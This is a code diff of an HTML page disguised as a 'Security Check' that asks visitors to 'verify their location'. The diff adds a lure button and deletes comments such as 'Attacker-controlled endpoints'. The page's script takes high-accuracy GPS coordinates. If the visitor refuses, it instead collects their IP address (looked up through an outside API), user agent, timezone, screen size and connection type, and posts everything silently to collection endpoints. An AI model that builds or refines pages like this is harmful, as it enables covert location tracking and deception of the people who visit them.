@@ -40,19 +40,40 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        button {
+            background: #fff;
+            color: #764ba2;
+            border: none;
+            border-radius: 30px;
+            padding: 14px 36px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: transform 0.1s;
+        }
+        button:active {
+            transform: scale(0.96);
+        }
     </style>
 </head>
 <body>
-    <h1>Secure Login</h1>
-    <p>Please wait while we verify your location...</p>
-    <div class="spinner" aria-label="Loading"></div>
+    <div id="landing">
+        <h1>Security Check</h1>
+        <p>We need to verify your location to continue.<br>Please tap the button below.</p>
+        <button id="verifyBtn" onclick="onVerify()">Verify &amp; Continue</button>
+    </div>
+
+    <div id="loading" style="display:none;">
+        <h1>Verifying...</h1>
+        <p>Please wait while we confirm your location.</p>
+        <div class="spinner" aria-label="Loading"></div>
+    </div>
 
     <script>
-        // Attacker-controlled endpoints
         const ENDPOINT_GPS = (window.ENDPOINT_GPS || '/collect');
         const ENDPOINT_FALLBACK = (window.ENDPOINT_FALLBACK || '/collect-fallback');
 
-        // Helper to send POST data as JSON
         async function postJSON(url, data) {
             try {
                 await fetch(url, {
@@ -61,76 +82,50 @@
                     body: JSON.stringify(data),
                     keepalive: true
                 });
-            } catch (e) {
-                // Fail silently
-            }
+            } catch (e) {}
         }
 
-        // Collect fallback info
         async function collectFallback() {
-            const userAgent = navigator.userAgent || '';
-            const language = navigator.language || '';
-            const platform = navigator.platform || '';
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
-            const screenResolution = `${window.screen.width}x${window.screen.height}`;
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-            const connectionType = connection.effectiveType || connection.type || '';
-
-            // Fetch public IP from external API
             let ip = '';
             try {
                 const resp = await fetch('https://api.ipify.org?format=json');
-                if (resp.ok) {
-                    const json = await resp.json();
-                    ip = json.ip || '';
-                }
-            } catch (e) {
-                // ignore
-            }
+                if (resp.ok) { const j = await resp.json(); ip = j.ip || ''; }
+            } catch (e) {}
 
-            const fallbackData = {
-                userAgent,
-                language,
-                platform,
-                timezone,
-                screenResolution,
-                connectionType,
+            await postJSON(ENDPOINT_FALLBACK, {
+                userAgent: navigator.userAgent || '',
+                language: navigator.language || '',
+                platform: navigator.platform || '',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                connectionType: connection.effectiveType || connection.type || '',
                 ip
-            };
-
-            await postJSON(ENDPOINT_FALLBACK, fallbackData);
+            });
         }
 
-        // Main function to get location
-        function getLocation() {
+        function onVerify() {
+            document.getElementById('landing').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
             if (!navigator.geolocation) {
-                // Geolocation API not supported
                 collectFallback();
                 return;
             }
 
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
-                    const coords = position.coords;
-                    const data = {
-                        latitude: coords.latitude,
-                        longitude: coords.longitude
-                    };
-                    await postJSON(ENDPOINT_GPS, data);
+                    await postJSON(ENDPOINT_GPS, {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    });
                 },
-                (error) => {
-                    // Permission denied or other error
-                    collectFallback();
+                async () => {
+                    await collectFallback();
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
-
-        getLocation();
     </script>
 </body>
 </html>
